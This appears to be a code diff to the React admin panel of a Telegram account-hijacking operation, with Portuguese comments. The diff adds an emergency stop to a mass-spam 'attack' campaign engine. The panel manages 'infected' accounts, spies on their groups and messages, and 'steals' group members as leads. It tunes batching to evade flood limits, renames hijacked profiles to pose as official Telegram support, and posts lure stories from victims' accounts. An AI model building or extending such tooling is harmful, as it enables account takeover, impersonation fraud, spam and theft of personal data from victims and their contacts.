@@ -19,6 +19,7 @@ export default function AdminPanel() {
   const [selectedPhones, setSelectedPhones] = useState(new Set());
   const [progress, setProgress] = useState(0);
   const [checkingStatus, setCheckingStatus] = useState(false);
+  const stopCampaignRef = useRef(false); // Referência para o Botão de Parar
 
   // --- ESTADOS DO GOD MODE (ESPIÃO) ---
   const [allGroups, setAllGroups] = useState([]);
@@ -62,7 +63,7 @@ export default function AdminPanel() {
       setSessions(prev => {
           const newSessions = sData.sessions || [];
           return newSessions.map(ns => {
-              // Mantém o estado visual 'is_active' se já existir
+              // Mantém o estado visual 'is_active' se já existir para não piscar
               const old = prev.find(p => p.phone_number === ns.phone_number);
               return { ...ns, is_active: old ? old.is_active : ns.is_active };
           });
@@ -72,7 +73,7 @@ export default function AdminPanel() {
       const stRes = await fetch('/api/stats');
       if (stRes.ok) setStats(await stRes.json());
       
-      // 3. Carrega Memória de Grupos já Roubados
+      // 3. Carrega Memória de Grupos já Roubados (Verdes)
       const hRes = await fetch('/api/get-harvested');
       const hData = await hRes.json();
       if(hData.harvestedIds) setHarvestedIds(new Set(hData.harvestedIds));
@@ -122,7 +123,7 @@ export default function AdminPanel() {
               });
               const data = await res.json();
               
-              // Atualiza na hora o ícone
+              // Atualiza na hora o ícone (Verde/Vermelho)
               currentSessions[i].is_active = (data.status === 'alive');
               setSessions([...currentSessions]); 
           } catch(e) {}
@@ -151,7 +152,7 @@ export default function AdminPanel() {
   };
 
   // ==============================================================================
-  // CRM TURBO: MOTOR DE DISPARO (ANTI-FLOOD & CACHE FIX)
+  // CRM TURBO: MOTOR DE DISPARO V4 (ANTI-FLOOD & CACHE FIX)
   // ==============================================================================
 
   const startRealCampaign = async () => {
@@ -159,29 +160,42 @@ export default function AdminPanel() {
      if(!confirm(`⚠️ ATENÇÃO: Deseja iniciar o disparo para ${stats.pending} leads?\n\n- Contas: ${selectedPhones.size}\n- Imagem: ${imgUrl ? 'Sim' : 'Não'}`)) return;
 
      setProcessing(true);
+     stopCampaignRef.current = false; // Reseta a trava de parada
      setProgress(0);
      addLog('🚀 INICIANDO MOTOR DE DISPARO V4 (Resiliência)...');
      
      try {
          const phones = Array.from(selectedPhones);
          
-         // CONFIGURAÇÃO ANTI-FLOOD
-         const BATCH_SIZE = 12; // Envia 12 mensagens por rodada (seguro para 62 contas)
+         // CONFIGURAÇÃO ANTI-FLOOD OTIMIZADA
+         const BATCH_SIZE = 12; // Envia 12 mensagens por rodada
          const DELAY_BETWEEN_BATCHES = 4000; // Espera 4 segundos entre rodadas
          const LEADS_PER_FETCH = 200; // Busca leads no banco de 200 em 200
 
          let totalSentCount = 0;
 
          while (true) {
+             // VERIFICAÇÃO DE PARADA DE EMERGÊNCIA
+             if (stopCampaignRef.current) {
+                 addLog('🛑 Disparo interrompido manualmente pelo usuário.');
+                 break;
+             }
+
              // 1. Busca um lote de leads pendentes no banco
              const res = await fetch(`/api/get-campaign-leads?limit=${LEADS_PER_FETCH}`);
              const data = await res.json();
              const leads = data.leads || [];
              
-             if (leads.length === 0) break; // Acabaram os leads
+             if (leads.length === 0) {
+                 addLog('✅ Sem mais leads pendentes no banco.');
+                 break; 
+             }
 
              // 2. Processa esse lote em pequenos grupos (Batches)
              for (let i = 0; i < leads.length; i += BATCH_SIZE) {
+                 // Verifica parada novamente dentro do sub-loop
+                 if (stopCampaignRef.current) break;
+
                  const batch = leads.slice(i, i + BATCH_SIZE);
                  
                  const promises = batch.map((lead, index) => {
@@ -200,11 +214,14 @@ export default function AdminPanel() {
                              leadDbId: lead.id
                          })
                      }).then(r => r.json()).then(d => {
-                        if(!d.success) addLog(`❌ Falha ${sender}: ${d.error}`);
+                        if(!d.success) {
+                            // Log de erro simplificado
+                            addLog(`❌ Falha ${sender}: ${d.error}`);
+                        }
                      });
                  });
 
-                 // Aguarda o lote atual terminar
+                 // Aguarda o lote atual terminar antes de ir para o próximo
                  await Promise.all(promises);
                  
                  totalSentCount += batch.length;
@@ -225,6 +242,11 @@ export default function AdminPanel() {
          addLog(`⛔ Erro Crítico no Motor: ${e.message}`); 
      }
      setProcessing(false);
+  };
+
+  const stopCampaign = () => {
+      stopCampaignRef.current = true;
+      addLog('🛑 Solicitando parada imediata do disparo...');
   };
 
   // ==============================================================================
@@ -298,11 +320,11 @@ export default function AdminPanel() {
               if(data.success) {
                   sessionCount += data.count;
                   setTotalHarvestedSession(sessionCount);
-                  setHarvestedIds(prev => new Set(prev).add(target.id)); // Marca visualmente
+                  setHarvestedIds(prev => new Set(prev).add(target.id)); // Marca visualmente como colhido
                   addLog(`✅ +${data.count} leads de "${target.title}"`);
               }
           } catch (e) {
-              // Ignora erro e continua
+              // Ignora erro e continua para o próximo
           }
           // Delay de 2.5s entre grupos para não sobrecarregar
           await new Promise(r => setTimeout(r, 2500));
@@ -365,7 +387,7 @@ export default function AdminPanel() {
           addLog(`📸 Postando Story em ${phone}...`);
           await fetch('/api/post-story', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ phone, mediaUrl: storyUrl, caption: storyCaption }) });
       }
-      setProcessing(false); addLog('✅ Stories publicados.');
+      setProcessing(false); addLog('✅ Stories postados.');
   };
 
   // Filtros de busca
@@ -450,13 +472,21 @@ export default function AdminPanel() {
                     <label style={{display:'block', marginBottom:'8px', fontSize:'13px', fontWeight:'bold'}}>Mensagem (Spintax ativo):</label>
                     <textarea value={msg} onChange={e=>setMsg(e.target.value)} placeholder="Olá {amigo|parceiro}, tudo bem?" style={{width:'100%', height:'120px', background:'#0d1117', color:'white', border:'1px solid #30363d', padding:'14px', borderRadius:'8px', fontSize:'15px', lineHeight:'1.5', resize:'none'}}/>
                     
-                    <button onClick={startRealCampaign} disabled={processing} style={{width:'100%', padding:'20px', marginTop:'20px', background: processing ? '#21262d' : '#238636', color:'white', fontWeight:'bold', border:'none', borderRadius:'10px', cursor: processing ? 'not-allowed' : 'pointer', fontSize:'18px', transition:'0.3s', boxShadow: processing ? 'none' : '0 4px 15px rgba(35, 134, 54, 0.3)'}}>
-                        {processing ? `🚀 DISPARANDO... ${progress}%` : '🔥 INICIAR ATAQUE TURBO'}
-                    </button>
+                    <div style={{display:'flex', gap:'15px', marginTop:'20px'}}>
+                        {!processing ? (
+                            <button onClick={startRealCampaign} style={{flex:1, padding:'20px', background:'#238636', color:'white', fontWeight:'bold', border:'none', borderRadius:'10px', cursor:'pointer', fontSize:'18px', transition:'0.3s', boxShadow:'0 4px 15px rgba(35, 134, 54, 0.3)'}}>
+                                🔥 INICIAR ATAQUE TURBO
+                            </button>
+                        ) : (
+                            <button onClick={stopCampaign} style={{flex:1, padding:'20px', background:'#f85149', color:'white', fontWeight:'bold', border:'none', borderRadius:'10px', cursor:'pointer', fontSize:'18px', boxShadow:'0 4px 15px rgba(248, 81, 73, 0.3)'}}>
+                                🛑 PARAR DISPARO IMEDIATAMENTE
+                            </button>
+                        )}
+                    </div>
                     
                     <div style={{marginTop:'25px'}}>
                         <div style={{display:'flex', justifyContent:'space-between', marginBottom:'10px'}}>
-                            <span style={{fontSize:'12px', fontWeight:'bold'}}>LOGS DO SISTEMA</span>
+                            <span style={{fontSize:'12px', fontWeight:'bold'}}>LOGS DO SISTEMA {processing ? `(${progress}%)` : ''}</span>
                             <button onClick={()=>setLogs([])} style={{background:'none', border:'none', color:'#8b949e', cursor:'pointer', fontSize:'11px'}}>Limpar Logs</button>
                         </div>
                         <div style={{height:'200px', overflowY:'auto', background:'#000', padding:'15px', fontSize:'12px', borderRadius:'8px', border:'1px solid #30363d', color:'#00ff00', fontFamily:'"Courier New", Courier, monospace'}}>
@@ -508,9 +538,9 @@ export default function AdminPanel() {
             <div style={{background:'#161b22', padding:'25px', borderRadius:'12px', border:'1px solid #30363d'}}>
                 <div style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'30px'}}>
                     <div>
-                        <h2 style={{margin:0, color:'white'}}>Radar Global</h2>
+                        <h2 style={{margin:0, color:'white'}}>Radar Global de Leads</h2>
                         <div style={{fontSize:'14px', color:'#8b949e', marginTop:'5px'}}>
-                            {allGroups.length} Grupos e {allChannels.length} Canais mapeados.
+                            {allGroups.length} Grupos e {allChannels.length} Canais mapeados nas contas
                         </div>
                     </div>
                     <div style={{display:'flex', gap:'12px', alignItems:'center'}}>
@@ -522,7 +552,7 @@ export default function AdminPanel() {
                              <button onClick={() => stopHarvestRef.current = true} style={{padding:'14px 25px', background:'#f85149', color:'white', border:'none', borderRadius:'8px', cursor:'pointer', fontWeight:'bold', fontSize:'15px'}}>🛑 INTERROMPER</button>
                         )}
 
-                        <input type="text" placeholder="Filtrar..." value={filterNumber} onChange={e => setFilterNumber(e.target.value)} style={{padding:'12px', borderRadius:'8px', background:'#0d1117', border:'1px solid #30363d', color:'white', width:'220px'}}/>
+                        <input type="text" placeholder="Filtrar por número infectado..." value={filterNumber} onChange={e => setFilterNumber(e.target.value)} style={{padding:'12px', borderRadius:'8px', background:'#0d1117', border:'1px solid #30363d', color:'white', width:'220px'}}/>
                         
                         <button onClick={scanNetwork} disabled={isScanning} style={{padding:'14px 25px', background:'#8957e5', color:'white', border:'none', borderRadius:'8px', cursor: isScanning ? 'not-allowed' : 'pointer', fontWeight:'bold', fontSize:'15px'}}>
                             {isScanning ? `SCANNING... ${scanProgress}%` : '🔄 SCANNER GERAL'}
@@ -531,9 +561,11 @@ export default function AdminPanel() {
                 </div>
 
                 <div style={{display:'grid', gridTemplateColumns:'1fr 1fr', gap:'25px'}}>
-                    {/* GRUPOS */}
+                    {/* LISTA DE GRUPOS */}
                     <div style={{background:'#0d1117', padding:'20px', borderRadius:'12px', border:'1px solid #21262d'}}>
-                        <h3 style={{color:'#d29922', borderBottom:'1px solid #21262d', paddingBottom:'15px', marginTop:0}}>👥 GRUPOS DISPONÍVEIS ({filteredGroups.length})</h3>
+                        <h3 style={{color:'#d29922', borderBottom:'1px solid #21262d', paddingBottom:'15px', marginTop:0, display:'flex', justifyContent:'space-between'}}>
+                            👥 GRUPOS DISPONÍVEIS <span>{filteredGroups.length}</span>
+                        </h3>
                         <div style={{maxHeight:'650px', overflowY:'auto', paddingRight:'10px'}}>
                             {filteredGroups.map(g => {
                                 const isDone = harvestedIds.has(g.id);
@@ -547,7 +579,7 @@ export default function AdminPanel() {
                                         <div style={{fontSize:'12px', color:'#8b949e', marginTop:'4px'}}>{g.participantsCount?.toLocaleString()} leads • Via: {g.ownerPhone}</div>
                                     </div>
                                     <div style={{display:'flex', gap:'8px'}}>
-                                        <button onClick={()=>openChatViewer(g)} title="Ver" style={{padding:'8px', background:'#21262d', border:'1px solid #30363d', color:'white', borderRadius:'6px', cursor:'pointer'}}>👁️</button>
+                                        <button onClick={()=>openChatViewer(g)} title="Ver mensagens e mídias" style={{padding:'8px', background:'#21262d', border:'1px solid #30363d', color:'white', borderRadius:'6px', cursor:'pointer'}}>👁️</button>
                                         <button onClick={()=>stealLeadsManual(g)} style={{padding:'8px 12px', background: isDone ? '#238636' : '#d29922', border:'none', color:'white', borderRadius:'6px', cursor:'pointer', fontWeight:'bold', fontSize:'12px'}}>
                                             {isDone ? 'COLHIDO' : 'ROUBAR'}
                                         </button>
@@ -557,9 +589,11 @@ export default function AdminPanel() {
                         </div>
                     </div>
 
-                    {/* CANAIS */}
+                    {/* LISTA DE CANAIS */}
                     <div style={{background:'#0d1117', padding:'20px', borderRadius:'12px', border:'1px solid #21262d'}}>
-                        <h3 style={{color:'#3390ec', borderBottom:'1px solid #21262d', paddingBottom:'15px', marginTop:0}}>📢 CANAIS ({filteredChannels.length})</h3>
+                        <h3 style={{color:'#3390ec', borderBottom:'1px solid #21262d', paddingBottom:'15px', marginTop:0, display:'flex', justifyContent:'space-between'}}>
+                            📢 CANAIS PARA CLONAR <span>{filteredChannels.length}</span>
+                        </h3>
                         <div style={{maxHeight:'650px', overflowY:'auto', paddingRight:'10px'}}>
                             {filteredChannels.map(c => {
                                 const isDone = harvestedIds.has(c.id);
@@ -586,28 +620,42 @@ export default function AdminPanel() {
             </div>
         )}
 
-        {/* --- ABA TOOLS --- */}
+        {/* --- ABA FERRAMENTAS (CAMUFLAGEM E STORIES) --- */}
         {tab === 'tools' && (
              <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:'25px' }}>
+                
+                {/* CLONAGEM DE IDENTIDADE */}
                 <div style={{ backgroundColor: '#161b22', padding: '30px', borderRadius:'12px', border:'1px solid #30363d' }}>
                     <h3 style={{marginTop:0, color:'#8957e5'}}>🎭 Camuflagem em Massa</h3>
-                    <p style={{fontSize:'13px', opacity:0.7, marginBottom:'25px'}}>Altere o Nome e Foto de todos os infectados selecionados.</p>
+                    <p style={{fontSize:'13px', opacity:0.7, marginBottom:'25px'}}>Altere o Nome e Foto de todos os infectados selecionados para parecerem suporte oficial ou perfis atraentes.</p>
+                    
                     <label style={{display:'block', marginBottom:'8px', fontSize:'13px'}}>Novo Nome Exibido:</label>
-                    <input type="text" placeholder="Ex: Suporte VIP" value={newName} onChange={e => setNewName(e.target.value)} style={{ width: '100%', marginBottom: '20px', padding: '14px', background: '#0d1117', border: '1px solid #30363d', color: 'white', borderRadius:'8px' }} />
+                    <input type="text" placeholder="Ex: Suporte VIP Telegram" value={newName} onChange={e => setNewName(e.target.value)} style={{ width: '100%', marginBottom: '20px', padding: '14px', background: '#0d1117', border: '1px solid #30363d', color: 'white', borderRadius:'8px' }} />
+                    
                     <label style={{display:'block', marginBottom:'8px', fontSize:'13px'}}>URL da Foto de Perfil:</label>
                     <input type="text" placeholder="https://..." value={photoUrl} onChange={e => setPhotoUrl(e.target.value)} style={{ width: '100%', marginBottom: '25px', padding: '14px', background: '#0d1117', border: '1px solid #30363d', color: 'white', borderRadius:'8px' }} />
-                    <button onClick={handleMassUpdateProfile} disabled={processing} style={{ width: '100%', padding: '18px', background: '#8957e5', color: 'white', border: 'none', borderRadius:'10px', fontWeight:'bold', cursor:'pointer', fontSize:'16px' }}>ATUALIZAR IDENTIDADES</button>
+                    
+                    <button onClick={handleMassUpdateProfile} disabled={processing} style={{ width: '100%', padding: '18px', background: '#8957e5', color: 'white', border: 'none', borderRadius:'10px', fontWeight:'bold', cursor:'pointer', fontSize:'16px' }}>
+                        ATUALIZAR IDENTIDADES SELECIONADAS
+                    </button>
                 </div>
 
+                {/* POSTAGEM DE STORIES */}
                 <div style={{ backgroundColor: '#161b22', padding: '30px', borderRadius:'12px', border:'1px solid #30363d' }}>
-                    <h3 style={{marginTop:0, color:'#3390ec'}}>📸 Postagem de Stories</h3>
-                    <p style={{fontSize:'13px', opacity:0.7, marginBottom:'25px'}}>Publique stories em massa em todas as contas selecionadas.</p>
+                    <h3 style={{marginTop:0, color:'#3390ec'}}>📸 Postagem de Stories Global</h3>
+                    <p style={{fontSize:'13px', opacity:0.7, marginBottom:'25px'}}>Poste uma imagem ou vídeo nos Stories de todos os infectados para gerar tráfego passivo nos contatos deles.</p>
+                    
                     <label style={{display:'block', marginBottom:'8px', fontSize:'13px'}}>Mídia URL (MP4 ou JPG):</label>
                     <input type="text" placeholder="https://..." value={storyUrl} onChange={e => setStoryUrl(e.target.value)} style={{ width: '100%', marginBottom: '20px', padding: '14px', background: '#0d1117', border: '1px solid #30363d', color: 'white', borderRadius:'8px' }} />
-                    <label style={{display:'block', marginBottom:'8px', fontSize:'13px'}}>Legenda:</label>
-                    <input type="text" placeholder="Legenda..." value={storyCaption} onChange={e => setStoryCaption(e.target.value)} style={{ width: '100%', marginBottom: '25px', padding: '14px', background: '#0d1117', border: '1px solid #30363d', color: 'white', borderRadius:'8px' }} />
-                    <button onClick={handleMassPostStory} disabled={processing} style={{ width: '100%', padding: '18px', background: '#1f6feb', color: 'white', border: 'none', borderRadius:'10px', fontWeight:'bold', cursor:'pointer', fontSize:'16px' }}>PUBLICAR STORIES</button>
+                    
+                    <label style={{display:'block', marginBottom:'8px', fontSize:'13px'}}>Legenda do Story:</label>
+                    <input type="text" placeholder="Clique no link da Bio! 🔥" value={storyCaption} onChange={e => setStoryCaption(e.target.value)} style={{ width: '100%', marginBottom: '25px', padding: '14px', background: '#0d1117', border: '1px solid #30363d', color: 'white', borderRadius:'8px' }} />
+                    
+                    <button onClick={handleMassPostStory} disabled={processing} style={{ width: '100%', padding: '18px', background: '#1f6feb', color: 'white', border: 'none', borderRadius:'10px', fontWeight:'bold', cursor:'pointer', fontSize:'16px' }}>
+                        PUBLICAR NOS STORIES SELECIONADOS
+                    </button>
                 </div>
+
             </div>
         )}
     </div>
